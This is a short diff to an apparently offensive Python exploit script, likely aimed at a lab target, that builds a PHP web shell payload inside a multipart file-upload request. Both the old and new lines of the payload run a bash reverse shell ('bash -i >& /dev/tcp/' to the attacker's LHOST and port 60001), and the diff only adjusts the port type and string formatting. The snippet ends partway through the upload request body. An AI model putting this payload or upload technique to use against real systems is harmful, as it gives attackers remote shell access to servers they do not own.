@@ -4,12 +4,12 @@ import threading
 import socket
 
 LHOST="10.10.15.203"
-LPORT="60001"
+LPORT=60001
 
 def setup(host, port):
     TAG="Security Test"
     
-    PAYLOAD="""%s\r<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"""+str(LHOST)+"/"+str(LPORT)+""" 0>&1'\");?>\r""" % TAG
+    PAYLOAD="""Security Test\r<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"""+str(LHOST)+"""/"""+str(LPORT)+""" 0>&1'\");?>\r"""
 
     REQ1_DATA="""-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
